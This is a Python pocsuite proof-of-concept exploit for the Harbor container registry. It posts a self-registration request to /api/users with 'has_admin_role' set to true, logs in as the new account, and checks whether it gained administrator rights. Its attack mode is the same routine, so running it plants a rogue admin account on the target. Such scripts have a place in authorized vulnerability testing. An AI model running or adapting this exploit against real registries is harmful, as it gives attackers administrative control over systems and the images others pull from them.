#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from urlparse import urlparse, urljoin
from pocsuite.api.request import req
import random
import string
import json
import re


class TestPOC(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'luckybool1020'

    def get_pass(self, harbor_session):
        random_user = ''.join(random.sample(string.letters + string.digits, 8))
        random_password = ''.join(
            random.sample(
                string.letters +
                string.digits,
                8))
        payload = '{{"username":"{random_user}","email":"{random_user}@user.com","realname":"{random_user}","password":"1Q{random_password}","comment":"1","has_admin_role":true}}'.format(
            random_user=random_user, random_password=random_password)
        header = {
            "Content-Type": "application/json",
            "Accept": "application/json"}
        url_acc = urljoin(self.url, '/api/users')
        harbor_session.post(url_acc, data=payload, headers=header, timeout=10)

        url_login = urljoin(self.url, '/c/login')
        header = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"}
        payload_login = 'principal={random_user}&password=1Q{random_password}'.format(
            random_user=random_user, random_password=random_password)
        harbor_session.post(url_login, data=payload_login, headers=header)
        return random_user

    def _verify(self):
        result = {}
        harbor_session = req.session()
        username = self.get_pass(harbor_session)
        url = urljoin(self.url, '/api/users')
        header = {
            "Content-Type": "application/json",
            "Accept": "application/json"}
        content = harbor_session.get(url, headers=header).content
        for item in json.loads(content):
            if item['username'] == username and item['has_admin_role']:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                return self.parse_output(result)
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
